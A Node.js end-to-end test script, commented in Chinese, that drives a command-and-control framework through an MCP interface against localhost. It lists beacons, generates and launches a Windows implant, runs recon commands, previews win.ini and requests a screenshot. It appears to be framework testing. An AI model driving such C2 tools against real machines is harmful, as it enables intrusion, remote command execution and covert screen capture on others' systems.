#!/usr/bin/env node
/**
 * mcp-operator-sim.mjs — 通过 Iris Client 内嵌 MCP Server 模拟操作员行为的侦察剧本。
 *
 * 与 mcp-e2e-chain.mjs 的区别:chain 验证"链路通不通"(硬门禁),本脚本模拟真实
 * 操作员的一次完整接触流程,逐步观察并如实报告结果(除登录态外全部软失败)。
 *
 * 前置:
 *   1. Iris Client(bin/client.exe)已启动且 GUI 已登录 TeamServer;
 *   2. MCP HTTP 已监听(默认 127.0.0.1:9333)。
 *
 * 剧本(只读侦察,不含任何破坏性动作):
 *   0. get_client_status 确认 GUI 会话;
 *   1. 态势感知:list_listeners / list_beacons;
 *   2. 目标选择:取存活 beacon;若无在线则经 e2e-mcp 监听器部署一个 C-beacon;
 *   3. 主机侦察:WHOAMI / PWD / LS drivers\etc / SHELL "cmd /c ver";
 *   4. 文件侧信道:preview_remote_file C:\Windows\win.ini;
 *   5. 屏幕采集:request_screenshot(可选,SCREENSHOT 命令支持与否如实记录);
 *   6. 审计回看:list_recent_events 尾部事件序列。
 */
import { spawn } from 'node:child_process'
import { existsSync } from 'node:fs'

const MCP = process.env.IRIS_MCP_ADDR || 'http://127.0.0.1:9333'
const LISTENER_NAME = process.env.E2E_LISTENER_NAME || 'e2e-mcp'
const BIND_PORT = Number(process.env.E2E_BIND_PORT || 19443)
const CMD_TIMEOUT = Number(process.env.OP_CMD_TIMEOUT_MS || 60000)
const REG_TIMEOUT = Number(process.env.OP_REG_TIMEOUT_MS || 90000)

let okCount = 0
let failCount = 0
function log(...a) { console.log('[operator]', ...a) }
function mark(ok, tag, detail) {
  if (ok) { okCount++; console.log(`[operator] ✓ ${tag}${detail ? ' — ' + detail : ''}`) }
  else { failCount++; console.log(`[operator] ✗ ${tag} — ${detail ?? '(无输出)'}`) }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

// ── 最小 MCP 客户端(Streamable HTTP + 会话头),同 e2e-chain ──────
let sid = ''
let seq = 100
async function post(payload) {
  const resp = await fetch(MCP + '/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json, text/event-stream',
      ...(sid ? { 'Mcp-Session-Id': sid } : {}),
    },
    body: JSON.stringify(payload),
  })
  const h = resp.headers.get('mcp-session-id')
  if (h) sid = h
  return { status: resp.status, body: await resp.text() }
}
function extractJSON(bodyText) {
  let text = bodyText.trim()
  if (text.startsWith('event:') || text.includes('\ndata:')) {
    text = text.split('\n').filter((l) => l.startsWith('data: ')).map((l) => l.slice(6)).join('')
  }
  if (!text) throw new Error('空响应')
  const obj = JSON.parse(text)
  if (obj.error) throw new Error('协议错误: ' + obj.error.message)
  const r = obj.result
  if (!r) throw new Error('无 result: ' + JSON.stringify(obj).slice(0, 300))
  if (r.isError) {
    throw new Error('工具错误: ' + (r.content?.[0]?.text ?? JSON.stringify(r).slice(0, 300)))
  }
  return r.content?.[0]?.text ?? '{}'
}
async function callTool(name, args = {}) {
  const { status, body } = await post({
    jsonrpc: '2.0', id: ++seq, method: 'tools/call',
    params: { name, arguments: args },
  })
  if (status !== 200) throw new Error(`HTTP ${status}: ${body.slice(0, 200)}`)
  return JSON.parse(extractJSON(body))
}
/** 结果 JSON 中按键名深搜(实测 beacon_id 等常嵌套在 data 层)。 */
function findKeyDeep(obj, keys) {
  if (!obj || typeof obj !== 'object') return undefined
  for (const k of keys) if (obj[k] !== undefined && obj[k] !== null) return obj[k]
  for (const v of Object.values(obj)) {
    const hit = findKeyDeep(v, keys)
    if (hit !== undefined) return hit
  }
  return undefined
}
/** TeamServer 列表接口形状不统一,归一化为数组。 */
function toArray(data) {
  if (Array.isArray(data)) return data
  for (const k of ['items', 'beacons', 'listeners', 'events', 'list']) {
    if (Array.isArray(data?.[k])) return data[k]
  }
  return []
}

log(`MCP=${MCP}`)
{
  const init = await post({
    jsonrpc: '2.0', id: ++seq, method: 'initialize', params: {
      protocolVersion: '2025-03-26', capabilities: {},
      clientInfo: { name: 'mcp-operator-sim', version: '0' },
    },
  })
  if (!init.body.includes('iris-client')) throw new Error(`握手失败: ${init.body.slice(0, 200)}`)
  await post({ jsonrpc: '2.0', method: 'notifications/initialized' })
  log('session ✓ server=iris-client')
}

// ── 步骤 0: 登录态(硬门禁) ───────────────────────────────────────
{
  const st = await callTool('get_client_status')
  if (!st.logged_in) throw new Error(`GUI 未登录(ws_status=${st.ws_status}),先人工登录一次`)
  log(`step0 ✓ 登录态就绪 api_base=${st.api_base} ws=${st.ws_status}`)
}

// ── 步骤 1: 全局态势 ─────────────────────────────────────────────
{
  const ls = toArray(await callTool('list_listeners'))
  log(`step1 listeners(${ls.length}): ` +
    ls.map((l) => `${l.name ?? l.id}=${l.status ?? '?'}`).join(', '))
  mark(true, 'listeners 观察')
}
{
  const bs = toArray(await callTool('list_beacons'))
  log(`step1 beacons(${bs.length}): ` +
    bs.map((b) => `${b.hostname ?? '?'}:${findKeyDeep(b, ['beacon_id'])}=${isAlive(b) ? 'alive' : 'stale(' + Math.round(secsSinceLastSeen(b)) + 's)'}`).join(', '))
  mark(true, 'beacons 观察')
}

// ── 步骤 2: 选目标;必要时部署 ────────────────────────────────────
let beaconID
// 列表接口无 status 字段,存活只能由 last_seen(心跳)新鲜度推断
function secsSinceLastSeen(b) {
  const t = Date.parse(b?.last_seen ?? '')
  return Number.isFinite(t) ? (Date.now() - t) / 1000 : Infinity
}
function isAlive(b) {
  const sleepSec = Number(b?.sleep) || 3
  return secsSinceLastSeen(b) < Math.max(30, sleepSec * 6)
}
{
  const bs = toArray(await callTool('list_beacons'))
  const pick = bs.find(isAlive)
  if (pick) {
    beaconID = findKeyDeep(pick, ['beacon_id', 'beaconId', 'id'])
    log(`step2 目标: ${pick.hostname ?? '?'} (${beaconID}) ` +
      `pid=${pick.pid} 心跳 ${Math.round(secsSinceLastSeen(pick))}s 前`)
  }
  if (!beaconID) {
    // 操作员自部署:复用/创建监听器 → 生成 C-beacon → 独立进程拉起
    log('step2 无可用 beacon,走部署分支…')
    const ls = toArray(await callTool('list_listeners'))
    let l = ls.find((x) => x.name === LISTENER_NAME && ['started', 'starting'].includes(x.status))
    if (!l) {
      const created = await callTool('create_listener', {
        name: LISTENER_NAME, protocol: 'http', listener_type: 'external',
        host: '127.0.0.1', port: BIND_PORT,
        callback_host: '127.0.0.1', callback_port: BIND_PORT,
      })
      const lid = created?.id ?? created?.data?.id ?? findKeyDeep(created, ['id'])
      if (!lid) throw new Error(`create_listener 未获得 id: ${JSON.stringify(created).slice(0, 200)}`)
      l = { id: lid }
      await sleep(800)
    }
    const gen = await callTool('generate_beacon', {
      listener_id: l.id, os: 'windows', arch: 'amd64', format: 'exe',
      stage_mode: 'stagerless', beacon_type: process.env.E2E_BEACON_TYPE || 'c',
    })
    if (!gen.path || !existsSync(gen.path)) throw new Error(`载荷未落盘: ${JSON.stringify(gen).slice(0, 200)}`)
    log(`deploy 载荷 ✓ ${gen.path} size=${gen.size}`)
    const base = Number((await callTool('list_recent_events')).last_seq ?? 0)
    spawn(gen.path, [], { detached: true, stdio: 'ignore' }).unref()
    const reg = await callTool('wait_for_event', {
      type_prefix: 'BEACON_REG', since_seq: base, timeout_ms: REG_TIMEOUT,
    }).catch((e) => ({ _err: String(e) }))
    beaconID = reg && !reg._err ? findKeyDeep(reg, ['beacon_id', 'beaconId', 'id']) : undefined
    if (!beaconID) throw new Error(`未捕获上线事件: ${reg?._err ?? JSON.stringify(reg).slice(0, 200)}`)
    log(`deploy 上线 ✓ beacon_id=${beaconID}`)
  }
  mark(Boolean(beaconID), '目标选定')
}

// ── 步骤 3~5: 主机侦察(软失败,逐项如实观察) ────────────────────
/** 下发命令并按 beacon 过滤等待结果事件;frames>1 时按 matched.seq 逐帧续读(SHELL 类异步任务:首帧是 Job 回执,次帧才是输出)。 */
async function runCommand(commandName, argsArr = [], frames = 1) {
  let cursor = Number((await callTool('list_recent_events')).last_seq ?? 0)
  const ack = await callTool('send_beacon_command', {
    beacon_id: String(beaconID), command: commandName, args: argsArr,
  })
  const texts = []
  for (let i = 0; i < frames; i++) {
    try {
      const ev = await callTool('wait_for_event', {
        type_prefix: 'COMMAND', beacon_id: String(beaconID),
        since_seq: cursor, timeout_ms: CMD_TIMEOUT,
      })
      const rec = ev.matched ?? ev
      texts.push(String(findKeyDeep(rec, ['text']) ?? '').trim())
      cursor = Math.max(cursor, Number(findKeyDeep(rec, ['seq']) ?? cursor) + 1)
    } catch (e) {
      texts.push(`(第${i + 1}帧未捕获: ${String(e).slice(0, 80)})`)
    }
  }
  return { ack, texts }
}
async function recon(tag, commandName, argsArr = [], frames = 1) {
  try {
    const { texts } = await runCommand(commandName, argsArr, frames)
    let out = texts.filter(Boolean).join(' ⟶ ').replace(/\s+/g, ' ').trim()
    // SHELL 类任务只捕到 "Job N started" 回执、没拿到实际输出时视为未完成观察
    const onlyAck = frames > 1 && texts.length > 0 &&
      texts.every((t) => /^Job \d+ started/.test(t) || t.startsWith('(第'))
    if (!onlyAck && out) {
      mark(true, `${tag} (${commandName})`,
        out.length > 160 ? out.slice(0, 160) + `…(${out.length}B)` : out)
    } else {
      mark(false, `${tag} (${commandName})`, out || '(无输出)')
    }
  } catch (e) {
    mark(false, `${tag} (${commandName})`, String(e).slice(0, 200))
  }
}

await recon('身份确认', 'WHOAMI')
await recon('工作目录', 'PWD')
await recon('目录列举', 'LS', ['C:\\Windows\\System32\\drivers\\etc'])
await recon('Shell 执行', 'SHELL', ['cmd /c ver'], 2)

// 文件预览:一次调用内聚 create→wait→GET→DELETE 全链
try {
  const pv = await callTool('preview_remote_file', {
    beacon_id: String(beaconID), remote_path: 'C:\\Windows\\win.ini',
  })
  const content = typeof pv.content === 'string' ? pv.content :
    typeof pv.text === 'string' ? pv.text : ''
  const firstLine = content.split(/\r?\n/).find((s) => s.trim()) ?? ''
  mark(content.includes('; for 16-bit app support'), 'win.ini 预览',
    `kind=${pv.kind} mime=${pv.mime} 首行="${firstLine}"`)
} catch (e) { mark(false, 'win.ini 预览', String(e).slice(0, 200)) }

// 屏幕采集:C-beacon 支持与否未知,作为能力探测如实记录
try {
  const ss = await callTool('request_screenshot', { beacon_id: String(beaconID) })
  const path = findKeyDeep(ss, ['path', 'file_path', 'local_path'])
  mark(true, '屏幕采集', path ?? JSON.stringify(ss).slice(0, 120))
} catch (e) { mark(false, '屏幕采集', String(e).slice(0, 200)) }

// ── 步骤 6: 审计回看 ─────────────────────────────────────────────
try {
  const ev = await callTool('list_recent_events', {})
  const items = toArray(ev.items ?? ev.events ?? ev).slice(-8)
  log(`step6 最近事件(last_seq=${ev.last_seq ?? '?'}):`)
  for (const it of items) {
    console.log(`   #${it.seq ?? it.Seq ?? '?'} ${(it.type ?? it.Type ?? '')}` +
      ` ${(JSON.stringify(it.payload ?? {}) || '').slice(0, 110)}`)
  }
  mark(items.length > 0, '审计回看', `${items.length} 条尾部事件`)
} catch (e) { mark(false, '审计回看', String(e).slice(0, 200)) }

console.log(`\n[operator] SUMMARY: OK=${okCount} FAIL=${failCount}`)
if (failCount > 0) process.exitCode = 2
